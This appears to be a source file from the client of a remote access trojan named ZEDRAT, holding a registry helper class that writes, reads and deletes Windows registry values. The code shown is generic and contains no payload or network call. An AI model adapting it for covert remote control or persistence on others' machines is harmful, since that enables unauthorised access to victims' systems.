using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;

namespace Client.ZEDRAT.Helper
{
	public static class RegKHelper
	{
		private static string DEFAULT_VALUE = string.Empty;

		public static bool AddRegistryKeyValue(RegistryHive hive, string path, string name, string value, bool addQuotes = false)
		{
			try
			{
				using RegistryKey registryKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path);
				if (registryKey == null)
				{
					return false;
				}
				if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
				{
					value = "\"" + value + "\"";
				}
				registryKey.SetValue(name, value);
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}

		public static RegistryKey OpenReadonlySubKey(RegistryHive hive, string path)
		{
			try
			{
				return RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenSubKey(path, writable: false);
			}
			catch
			{
				return null;
			}
		}

		public static bool DeleteRegistryKeyValue(RegistryHive hive, string path, string name)
		{
			try
			{
				using RegistryKey registryKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path);
				if (registryKey == null)
				{
					return false;
				}
				registryKey.DeleteValue(name, throwOnMissingValue: true);
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}

		public static bool IsDefaultValue(string valueName)
		{
			return string.IsNullOrEmpty(valueName);
		}

		public static RegValueData[] AddDefaultValue(List<RegValueData> values)
		{
			if (!values.Any((RegValueData value) => RegKHelper.IsDefaultValue(value.Name)))
			{
				values.Add(RegKHelper.GetDefaultValue());
			}
			return values.ToArray();
		}

		public static RegValueData[] GetDefaultValues()
		{
			return new RegValueData[1] { RegKHelper.GetDefaultValue() };
		}

		private static RegValueData GetDefaultValue()
		{
			return new RegValueData(RegKHelper.DEFAULT_VALUE, RegistryValueKind.String, null);
		}
	}
}
